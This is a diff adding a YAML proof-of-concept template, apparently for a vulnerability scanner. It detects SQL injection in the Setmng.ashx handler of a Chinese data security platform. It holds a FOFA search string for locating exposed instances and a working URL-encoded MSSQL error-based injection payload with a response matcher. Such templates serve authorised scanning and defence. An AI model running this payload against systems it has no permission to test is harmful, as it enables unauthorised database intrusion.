@@ -1,0 +1,17 @@
+id: poc-yaml-hustcad-setmng-ashx-sqli
+info:
+  name: 天喻软件数据安全平台 Setmng.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 天喻软件数据安全平台
+  fofa: app="天喻软件数据安全平台"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /p_handler/Setmng.ashx?operatetype=getparamvalue&paramname=1%27%2b(SELECT%20CHAR(90)%20WHERE%205505=5505%20AND%206796%20IN%20(SELECT%20(CHAR(113)%2b(SELECT%20(CASE%20WHEN%20(6796=6796)%20THEN%20CHAR(49)%20ELSE%20CHAR(48)%20END))%2bsys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}')))))%2b%27
+  expression: "status_code == 500 && \ncontains(body,\"在将\") &&\ncontains(body,t2)\
+    \ &&\ncontains(body,\"转换成数据类型\") &&\ncontains(body,\"SqlException\")\n"
+transport: http
